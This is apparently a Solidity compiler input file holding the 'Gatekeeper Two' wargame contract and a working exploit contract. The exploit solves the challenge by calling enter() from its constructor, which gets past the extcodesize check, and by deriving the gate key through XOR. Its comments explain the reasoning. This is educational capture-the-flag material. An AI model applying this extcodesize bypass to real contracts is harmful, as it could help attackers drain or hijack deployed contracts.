{
  "language": "Solidity",
  "sources": {
    "contracts/GateKeeperTwo.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract GatekeeperTwo {\n    address public entrant;\n\n    modifier gateOne() {\n        require(msg.sender != tx.origin);\n        _;\n    }\n\n    modifier gateTwo() {\n        uint x;\n        assembly {\n            x := extcodesize(caller())\n        }\n        require(x == 0);\n        _;\n    }\n\n    modifier gateThree(bytes8 _gateKey) {\n        require(\n            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) ==\n                type(uint64).max\n        );\n        _;\n    }\n\n    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n        entrant = tx.origin;\n        return true;\n    }\n}\n\ncontract GatekeeperTwoExploit {\n    GatekeeperTwo private immutable gatekeeper;\n\n    constructor(address _keeper) {\n        gatekeeper = GatekeeperTwo(_keeper);\n        // We want the following condition:\n        //  uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) ==\n        //         type(uint64).max\n\n        // type(uint64).max = uint64(0)-1 // this is overflow\n        // we use communicative property of XOR\n\n        // a ^ b = c\n        // a ^ a ^ b = a ^ c\n        // a ^ a = 0 (XOR onto itself -> a ^ a)\n        // 0 ^ b = b\n        // b = a ^ c\n        // answer is uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0)-1\n        // gatekey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0)-1)\n\n        bytes8 key;\n        // since there is an overflow -> place it inside unchecked block\n        unchecked {\n            key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1));\n        }\n\n        // since we are calling inside constructor -> codesize == 0, at this point, code is\n        // not stored in the storage\n        gatekeeper.enter(key);\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata",
          "devdoc",
          "userdoc",
          "storageLayout",
          "evm.gasEstimates"
        ],
        "": [
          "ast"
        ]
      }
    },
    "metadata": {
      "useLiteralContent": true
    }
  }
}